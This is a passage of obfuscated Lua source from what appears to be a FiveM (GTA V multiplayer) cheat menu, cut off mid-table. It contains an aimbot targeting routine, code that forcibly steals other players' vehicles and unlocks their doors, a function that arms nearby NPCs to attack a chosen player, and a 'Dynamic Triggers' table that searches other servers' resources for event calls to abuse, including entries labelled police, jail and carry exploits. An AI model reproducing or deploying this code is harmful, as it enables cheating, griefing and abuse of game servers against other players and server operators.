                    nlFXKkFxuKQAk.natives.AddTextComponentSubstringPlayerName(nlFXKkFxuKQAk.natives.GetPlayerName(src))
                    nlFXKkFxuKQAk.natives.EndTextCommandSetBlipName(blip)
                    jrnyLearIyzKiSIen.Blips[src] = blip
                end
            end
        end,
        GetEmote = function(emote)
            local cleanInput = RfPsUKHSFWJuBEJuz.rE.LumString.LumLower(emote)
            local listy = {
                "handshake",
                "handshake2",
                "hug",
                "hug2",
                "bro",
                "bro2",
                "give",
                "give2",
                "baseball",
                "baseballthrow",
                "stickup",
                "stickupscared",
                "punch",
                "punched",
                "headbutt",
                "headbutted",
                "slap2",
                "slap",
                "slapped",
                "slapped2",
                "dancef",
                "dancef2",
                "dancef3",
                "dancef4",
                "dancef5",
                "dancef6",
                "danceslow2",
                "danceslow3",
                "danceslow4",
                "dance",
                "dance2",
                "dance3",
                "dance4",
                "danceupper",
                "danceupper2",
                "danceshy",
                "danceshy2",
                "danceslow",
                "dancesilly9",
                "dance6",
                "dance7",
                "dance8",
                "dancesilly",
                "dancesilly2",
                "dancesilly3",
                "dancesilly4",
                "dancesilly5",
                "dancesilly6",
                "dance9",
                "dancesilly8",
                "dancesilly7",
                "dance5",
                "danceglowstick",
                "danceglowstick2",
                "danceglowstick3",
                "dancehorse",
                "dancehorse2",
                "dancehorse3"
            }
            for i=1, #listy do
                if cleanInput == listy[i] then
                    return listy[i]
                end
            end
            return nil
        end,
        StealDaV = function(v)
            local pedInv = nlFXKkFxuKQAk.natives.GetPedInVehicleSeat(v, -1)
            while not nlFXKkFxuKQAk.natives.HasModelLoaded(RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01')) do
                nlFXKkFxuKQAk.natives.RequestModel(RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01'))
                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
            end
            while not nlFXKkFxuKQAk.natives.IsVehicleSeatFree(v, -1) do
                nlFXKkFxuKQAk.natives.ClearPedTasksImmediately(pedInv)
                RfPsUKHSFWJuBEJuz.rE.LumWait(0)
            end
            local newPed = nlFXKkFxuKQAk.natives.CreatePedInsideVehicle(v, 4, RfPsUKHSFWJuBEJuz.rE.LumHash('mp_m_freemode_01'), -1, true, false)
            nlFXKkFxuKQAk.natives.TaskVehicleDriveToCoordLongrange(newPed, v, -558.2048, -2869.4, 8.888, 200.0, 2883621, 5)
            nlFXKkFxuKQAk.natives.SetEntityInvincible(newPed, true)
        end,
    }
}

DmSgpcIoUEJtyTfBBt.FunFunc.FindLeClosestCar = function()
    local cars = {}
    for k in DmSgpcIoUEJtyTfBBt.FunFunc.FindLeCars() do
        local me = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), false)
        local car = nlFXKkFxuKQAk.natives.GetEntityCoords(k, false)
        local dist = nlFXKkFxuKQAk.natives.GetDistanceBetweenCoords(me.x, me.y, me.z, car.x, car.y, car.z, false)
        RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(cars, {k, dist})
    end
    RfPsUKHSFWJuBEJuz.rE.LumTable.LumSort(cars, function(a,b)
        return (a[2] < b[2])
    end)
    return cars[1][1]
end

DmSgpcIoUEJtyTfBBt.FunFunc.elvroomvroom = function()
    local vehicle = DmSgpcIoUEJtyTfBBt.FunFunc.FindLeClosestCar()
    if vehicle ~= nil then
        local cord = nlFXKkFxuKQAk.natives.GetEntityCoords(vehicle, false)
        local me = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), false)
        local dist = nlFXKkFxuKQAk.natives.GetDistanceBetweenCoords(me.x, me.y, me.z, cord.x, cord.y, cord.z, false)
        if dist <= 2 then
            nlFXKkFxuKQAk.natives.SetPedIntoVehicle(nlFXKkFxuKQAk.natives.PlayerPedId(), vehicle, -1)
            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are Now ~g~Driving ~w~Your New Vehicle')
        else
            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~r~ERROR: ~w~You Are Not Near A Vehicle')
        end
    else
        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~r~ERROR: ~w~You Are Not Near A Vehicle')
    end
end

DmSgpcIoUEJtyTfBBt.FunFunc.unlockdacar = function()
    local vehicle = DmSgpcIoUEJtyTfBBt.FunFunc.FindLeClosestCar()
    if vehicle ~= nil then
        local cord = nlFXKkFxuKQAk.natives.GetEntityCoords(vehicle, false)
        local me = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), false)
        local dist = nlFXKkFxuKQAk.natives.GetDistanceBetweenCoords(me.x, me.y, me.z, cord.x, cord.y, cord.z, false)
        if dist <= 2 then
            nlFXKkFxuKQAk.natives.SetVehicleDoorsLockedForAllPlayers(vehicle, false)
            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification("You Have ~g~Succesfuly ~w~Unlocked The Vehicle's Doors")
        else
            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~r~ERROR: ~w~You Are Not Near A Vehicle')
        end
    else
        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~r~ERROR: ~w~You Are Not Near A Vehicle')
    end
end

DmSgpcIoUEJtyTfBBt.FunFunc.PedAttack = function(target, attackType)
    local coords = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(target), true)
    local weparray;
    local allweapons = {    "WEAPON_UNARMED",    "WEAPON_KNIFE",    "WEAPON_KNUCKLE",    "WEAPON_NIGHTSTICK",    "WEAPON_HAMMER",    "WEAPON_BAT",    "WEAPON_GOLFCLUB",    "WEAPON_CROWBAR",    "WEAPON_BOTTLE",    "WEAPON_DAGGER",    "WEAPON_HATCHET",    "WEAPON_MACHETE",    "WEAPON_FLASHLIGHT",    "WEAPON_SWITCHBLADE",    "WEAPON_POOLCUE",    "WEAPON_PIPEWRENCH",      "WEAPON_GRENADE",    "WEAPON_STICKYBOMB",    "WEAPON_PROXMINE",    "WEAPON_BZGAS",    "WEAPON_SMOKEGRENADE",    "WEAPON_MOLOTOV",    "WEAPON_FIREEXTINGUISHER",    "WEAPON_PETROLCAN",    "WEAPON_SNOWBALL",    "WEAPON_FLARE",    "WEAPON_BALL",      "WEAPON_PISTOL",    "WEAPON_PISTOL_MK2",    "WEAPON_COMBATPISTOL",    "WEAPON_APPISTOL",    "WEAPON_REVOLVER",    "WEAPON_REVOLVER_MK2",    "WEAPON_DOUBLEACTION",    "WEAPON_PISTOL50",    "WEAPON_SNSPISTOL",    "WEAPON_SNSPISTOL_MK2",    "WEAPON_HEAVYPISTOL",    "WEAPON_VINTAGEPISTOL",    "WEAPON_STUNGUN",    "WEAPON_FLAREGUN",    "WEAPON_MARKSMANPISTOL",    "WEAPON_RAYPISTOL",       "WEAPON_MICROSMG",    "WEAPON_MINISMG",    "WEAPON_SMG",    "WEAPON_SMG_MK2",    "WEAPON_ASSAULTSMG",    "WEAPON_COMBATPDW",    "WEAPON_GUSENBERG",    "WEAPON_MACHINEPISTOL",    "WEAPON_MG",    "WEAPON_COMBATMG",    "WEAPON_COMBATMG_MK2",    "WEAPON_RAYCARBINE",           "WEAPON_ASSAULTRIFLE",    "WEAPON_ASSAULTRIFLE_MK2",    "WEAPON_CARBINERIFLE",    "WEAPON_CARBINERIFLE_MK2",    "WEAPON_ADVANCEDRIFLE",    "WEAPON_SPECIALCARBINE",    "WEAPON_SPECIALCARBINE_MK2",    "WEAPON_BULLPUPRIFLE",    "WEAPON_BULLPUPRIFLE_MK2",    "WEAPON_COMPACTRIFLE",        "WEAPON_PUMPSHOTGUN",    "WEAPON_PUMPSHOTGUN_MK2",    "WEAPON_SWEEPERSHOTGUN",    "WEAPON_SAWNOFFSHOTGUN",    "WEAPON_BULLPUPSHOTGUN",    "WEAPON_ASSAULTSHOTGUN",    "WEAPON_MUSKET",    "WEAPON_HEAVYSHOTGUN",    "WEAPON_DBSHOTGUN",      "WEAPON_SNIPERRIFLE",    "WEAPON_HEAVYSNIPER",    "WEAPON_HEAVYSNIPER_MK2",    "WEAPON_MARKSMANRIFLE",    "WEAPON_MARKSMANRIFLE_MK2",      "WEAPON_GRENADELAUNCHER",    "WEAPON_GRENADELAUNCHER_SMOKE",    "WEAPON_RPG",    "WEAPON_MINIGUN",    "WEAPON_FIREWORK",    "WEAPON_RAILGUN",    "WEAPON_HOMINGLAUNCHER",    "WEAPON_COMPACTLAUNCHER",    "WEAPON_RAYMINIGUN",}
    local meleeweapons = {    {"WEAPON_KNIFE", "Knife"},    {"WEAPON_KNUCKLE", "Brass Knuckles"},    {"WEAPON_NIGHTSTICK", "Nightstick"},    {"WEAPON_HAMMER", "Hammer"},    {"WEAPON_BAT", "Baseball Bat"},    {"WEAPON_GOLFCLUB", "Golf Club"},    {"WEAPON_CROWBAR", "Crowbar"},    {"WEAPON_BOTTLE", "Bottle"},    {"WEAPON_DAGGER", "Dagger"},    {"WEAPON_HATCHET", "Hatchet"},    {"WEAPON_MACHETE", "Machete"},    {"WEAPON_FLASHLIGHT", "Flashlight"},    {"WEAPON_SWITCHBLADE", "Switchblade"},    {"WEAPON_POOLCUE", "Pool Cue"},    {"WEAPON_PIPEWRENCH", "Pipe Wrench"}}
    local pistolweapons = {    {"WEAPON_PISTOL", "Pistol"},    {"WEAPON_PISTOL_MK2", "Pistol Mk II"},    {"WEAPON_COMBATPISTOL", "Combat Pistol"},    {"WEAPON_APPISTOL", "AP Pistol"},    {"WEAPON_REVOLVER", "Revolver"},    {"WEAPON_REVOLVER_MK2", "Revolver Mk II"},    {"WEAPON_DOUBLEACTION", "Double Action Revolver"},    {"WEAPON_PISTOL50", "Pistol .50"},    {"WEAPON_SNSPISTOL", "SNS Pistol"},    {"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},    {"WEAPON_HEAVYPISTOL", "Heavy Pistol"},    {"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},    {"WEAPON_STUNGUN", "Tazer"},    {"WEAPON_FLAREGUN", "Flaregun"},    {"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},    {"WEAPON_RAYPISTOL", "Up-n-Atomizer"}}
    local heavyweapons = {    {"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},    {"WEAPON_RPG", "RPG"},    {"WEAPON_MINIGUN", "Minigun"},    {"WEAPON_FIREWORK", "Firework Launcher"},    {"WEAPON_RAILGUN", "Railgun"},    {"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},    {"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},    {"WEAPON_RAYMINIGUN", "Widowmaker"}}    
    
    if attackType == 1 then
        weparray = meleeweapons 
    elseif attackType == 2 then
        weparray = pistolweapons
    elseif attackType == 3 then 
        weparray = heavyweapons
    elseif attackType == 4 then 
        weparray = allweapons
    end

    for k in DmSgpcIoUEJtyTfBBt.FunFunc.FindThePederinos() do
        if k ~= nlFXKkFxuKQAk.natives.GetPlayerPed(target) and not nlFXKkFxuKQAk.natives.IsPedAPlayer(k) and nlFXKkFxuKQAk.natives.GetDistanceBetweenCoords(coords, nlFXKkFxuKQAk.natives.GetEntityCoords(k, true)) < 2000 then
            local rand = RfPsUKHSFWJuBEJuz.rE.LumMath.LumCeli(RfPsUKHSFWJuBEJuz.rE.LumMath.LumRand(#weparray))
            if weparray ~= allweapons then 
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(k, RfPsUKHSFWJuBEJuz.rE.LumHash(weparray[rand][1]), 9999, 0, 1)
            else 
                nlFXKkFxuKQAk.natives.GiveWeaponToPed(k, RfPsUKHSFWJuBEJuz.rE.LumHash(weparray[rand]), 9999, 0, 1) 
            end
            nlFXKkFxuKQAk.natives.ClearPedTasks(k)
            nlFXKkFxuKQAk.natives.TaskCombatPed(k, nlFXKkFxuKQAk.natives.GetPlayerPed(target), 0, 16)
            nlFXKkFxuKQAk.natives.SetPedCombatAbility(k, 100)
            nlFXKkFxuKQAk.natives.SetPedCombatRange(k, 2)
            nlFXKkFxuKQAk.natives.SetPedCombatAttributes(k, 46, 1)
            nlFXKkFxuKQAk.natives.SetPedCombatAttributes(k, 5, 1)
        end
    end
end

DmSgpcIoUEJtyTfBBt.FunFunc.GetAllDaPeds = function()
    local list = {}

    for ped in DmSgpcIoUEJtyTfBBt.FunFunc.FindThePederinos() do
        local mec = nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.PlayerPedId(), false)
        local pedc = nlFXKkFxuKQAk.natives.GetEntityCoords(ped, false)
        list[ped] = {
            ped = ped,
            dist = nlFXKkFxuKQAk.natives.GetDistanceBetweenCoords(mec.x, mec.y, mec.z, pedc.x, pedc.y, pedc.z, true)
        }
    end

    RfPsUKHSFWJuBEJuz.rE.LumTable.LumSort(list, function(a, b) return a.dist < b.dist end)

    return RfPsUKHSFWJuBEJuz.rE.Lumpairs(list)
end

DmSgpcIoUEJtyTfBBt.FunFunc.InsideDaCircle = function(ped)
    local screenx, screeny = nlFXKkFxuKQAk.natives.GetActiveScreenResolution()
    local radius = jrnyLearIyzKiSIen.func.translatesprite(RfPsUKHSFWJuBEJuz.rE.LumToNum(jrnyLearIyzKiSIen.config.aimbotfov))

    local coords = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 31086, 0.0, 0.0, 0.0)
    local showing, screenx1, screeny1 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
    local isin = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx1 * screenx, screeny1 * screeny)

    local coords1 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 0, 0.0, 0.0, 0.0)
    local showing2, screenx2, screeny2 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords1.x, coords1.y, coords1.z)
    local isin1 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx2 * screenx, screeny2 * screeny)

    local coords2 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 22711, 0.0, 0.0, 0.0)
    local showing3, screenx3, screeny3 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords2.x, coords2.y, coords2.z)
    local isin2 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx3 * screenx, screeny3 * screeny)

    local coords3 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 28252, 0.0, 0.0, 0.0)
    local showing4, screenx4, screeny4 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords3.x, coords3.y, coords3.z)
    local isin3 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx4 * screenx, screeny4 * screeny)

    local coords4 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 45509, 0.0, 0.0, 0.0)
    local showing5, screenx5, screeny5 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords4.x, coords4.y, coords4.z)
    local isin4 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx5 * screenx, screeny5 * screeny)

    local coords5 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 40269, 0.0, 0.0, 0.0)
    local showing6, screenx6, screeny6 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords5.x, coords5.y, coords5.z)
    local isin5 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx6 * screenx, screeny6 * screeny)

    local coords6 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 58271, 0.0, 0.0, 0.0)
    local showing7, screenx7, screeny7 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords6.x, coords6.y, coords6.z)
    local isin6 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx7 * screenx, screeny7 * screeny)

    local coords7 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 51826, 0.0, 0.0, 0.0)
    local showing8, screenx8, screeny8 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords7.x, coords7.y, coords7.z)
    local isin7 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx8 * screenx, screeny8 * screeny)

    local coords8 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 24816, 0.0, 0.0, 0.0)
    local showing9, screenx9, screeny9 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords8.x, coords8.y, coords8.z)
    local isin8 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx9 * screenx, screeny9 * screeny)

    local coords9 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 24817, 0.0, 0.0, 0.0)
    local showing10, screenx10, screeny10 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords9.x, coords9.y, coords9.z)
    local isin9 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx10 * screenx, screeny10 * screeny)

    local coords10 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 24818, 0.0, 0.0, 0.0)
    local showing11, screenx11, screeny11 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords10.x, coords10.y, coords10.z)
    local isin10 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx11 * screenx, screeny11 * screeny)

    local coords11 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 14201, 0.0, 0.0, 0.0)
    local showing12, screenx12, screeny12 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords11.x, coords11.y, coords11.z)
    local isin11 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx12 * screenx, screeny12 * screeny)

    local coords12 = nlFXKkFxuKQAk.natives.GetPedBoneCoords(ped, 52301, 0.0, 0.0, 0.0)
    local showing13, screenx13, screeny13 = nlFXKkFxuKQAk.natives.GetScreenCoordFromWorldCoord(coords12.x, coords12.y, coords12.z)
    local isin12 = jrnyLearIyzKiSIen.func.insidecircle(screenx / 2, screeny / 2, radius, screenx13 * screenx, screeny13 * screeny)

    if not showing and not showing2 and not showing3 and not showing4 and not showing5 and not showing6 and not showing7 and not showing8 and not showing9 and not showing10 and not showing11 and not showing12 and not showing13 then 
        return false 
    end

    if isin or isin1 or isin2 or isin3 or isin4 or isin5 or isin6 or isin7 or isin8 or isin9 or isin10 or isin11 or isin12 then
        if not nlFXKkFxuKQAk.natives.IsEntityDead(ped) then   
            return true
        else
            return false
        end
    end
end

DmSgpcIoUEJtyTfBBt.FunFunc.fuckYou = function()
    for ped in DmSgpcIoUEJtyTfBBt.FunFunc.GetAllDaPeds() do 
        if jrnyLearIyzKiSIen.config.features.ABTargetPlayers then
            local BenitoId = nlFXKkFxuKQAk.natives.GetPlayerServerId(nlFXKkFxuKQAk.natives.NetworkGetPlayerIndexFromPed(ped))
            --thanks benito
            if DmSgpcIoUEJtyTfBBt.FunFunc.InsideDaCircle(ped) and nlFXKkFxuKQAk.natives.IsPedAPlayer(ped) and ped ~= nlFXKkFxuKQAk.natives.PlayerPedId() and not jrnyLearIyzKiSIen.func.Random_stringcontains(jrnyLearIyzKiSIen.config.aimbotfriend, BenitoId) then
                closestPed.ElPed = ped
            end
        end
        if jrnyLearIyzKiSIen.config.features.ABTargetPed then
            if DmSgpcIoUEJtyTfBBt.FunFunc.InsideDaCircle(ped) and not nlFXKkFxuKQAk.natives.IsPedAPlayer(ped) then
                closestPed.ElPed = ped
            end
        end
    end
end

DmSgpcIoUEJtyTfBBt.FunFunc.timeOut = function(sec)
    if closestPed.ElPed ~= nil then
        closestPed.ElDeady = closestPed.ElPed
    end
    if nlFXKkFxuKQAk.natives.IsEntityDead(closestPed.ElDeady) then
        local PedKiller = nlFXKkFxuKQAk.natives.GetPedSourceOfDeath(closestPed.ElDeady)
        if PedKiller == nlFXKkFxuKQAk.natives.PlayerPedId() then
            RfPsUKHSFWJuBEJuz.rE.LumWait(sec)
            closestPed.ElDeady = nil
        end
    end
end

-- Dynamic Triggers --
local JHJzZjIJzisHI = {
    {
    resource = "esx_vangelico_robbery",
    resourcelooklike = {"vangelico", "jewlery"},
    file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
    lookfor = "ClearPedTasksImmediately.GetPlayerPed.-1..",
    name = "vangelico_get",
    noparam = true
    },

    {
    resource = "esx_vangelico_robbery",
    resourcelooklike = {"vangelico", "jewlery"},
    file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
    lookfor = "FreezeEntityPosition.playerPed, false.",
    name = "vangelico_sell",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'CokeField\' then",
    name = "coke_feild",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'CokeProcessing\' then",
    name = "coke_process",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'CokeDealer\' then",
    name = "coke_sell",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'MethField\' then",
    name = "meth_field",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'MethProcessing\' then",
    name = "meth_process",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'MethDealer\' then",
    name = "meth_sell",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'WeedField\' then",
    name = "weed_field",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'WeedProcessing\' then",
    name = "weed_process",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'WeedDealer\' then",
    name = "weed_sell",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'OpiumField\' then",
    name = "opium_field",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'OpiumProcessing\' then",
    name = "opium_process",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "elseif CurrentAction == \'OpiumDealer\' then",
    name = "opium_sell",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "CurrentAction = nil",
    name = "stop_feild_coke",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "estCoke",
    name = "stop_process_coke",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "sformCoke",
    name = "stop_sell_coke",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "stopSell",
    name = "stop_feild_meth",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "tMeth",
    name = "stop_process_meth",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "sformMeth",
    name = "stop_sell_meth",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "stopSellM",
    name = "stop_feild_weed",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "vestWeed",
    name = "stop_process_weed",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "ransformWeed",
    name = "stop_sell_weed",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "stopSellW",
    name = "stop_feild_opium",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "stopHarvest",
    name = "stop_process_opium",
    noparam = true
    },

    {
    resource = "drugs",
    resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
    file = {"client/esx_illegal_drugs_cl.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
    lookfor = "formOpium",
    name = "stop_sell_opium",
    noparam = true
    },

    {
    resource = "esx_dmvschool",
    resourcelooklike = {"dmvschool"},
    file = {"client/main.lua"},
    lookfor = ", Config.Prices%b[]",
    name = "dmv_pay",
    noparam = false,
    },

    {
    resource = "esx_dmvschool",
    resourcelooklike = {"dmvschool"},
    file = {"client/main.lua"},
    lookfor = ", %b''",
    name = "dmv_getlicense",
    noparam = false,
    },

    {
    resource = "gcphone",
    file = {"client/twitter.lua"},
    resourcelooklike = {"phone"},
    lookfor = ", data.username or '', data.password or '', data.message",
    name = "gcphone_posttweet",
    noparam = false,
    },

    {
    resource = "gcphone",
    file = {"client/twitter.lua"},
    resourcelooklike = {"phone"},
    lookfor = ", data.username, data.password, data.avatarUrl",
    name = "gcphone_createtwiteracc",
    noparam = false,
    },
    
    {
    resource = "gcphone",
    file = {"client/twitter.lua"},
    resourcelooklike = {"phone"},
    lookfor = ", data.username, data.password",
    name = "gcphone_logintwitteracc",
    noparam = false,
    },

    {
    resource = "esx_vehicleshop",
    resourcelooklike = {"vehicle"},
    file = {"client/main.lua"},
    lookfor = ", vehicleProps",
    name = "vehicleshop_ownedveh",
    noparam = false,
    },

    {
    resource = "esx_policejob",
    resourcelooklike = {"police"},
    file = {"client/main.lua"},
    lookfor = ", GetPlayerServerId%b(),",
    name = "police_exploit",
    noparam = false,
    },

    {
    resource = "CarryPeople",
    resourcelooklike = {"carry"},
    file = {"cl_carry.lua"},
    lookfor = ", closestPlayer,",
    name = "carry_exploit",
    noparam = false,
    },
    
    {
    resource = "CarryPeople",
    resourcelooklike = {"carry"},
    file = {"cl_carry.lua"},
    lookfor = ",target",
    name = "carrypeople_stop",
    noparam = false,
    },

    {
    resource = "esx-qalle-jail",
    resourcelooklike = {"jail"},
    file = {"client/client.lua"},
    lookfor = ", function%(newJailTime%)",
    name = "qalle_jailer",
    noparam = false,
    },

    {
    resource = "esx_policejob",
    resourcelooklike = {"police"},
    file = {"client/main.lua"},
    lookfor = ", player, c",
    name = "community",
    noparam = false,
    },

    {
    resource = "esx_truckerjob",
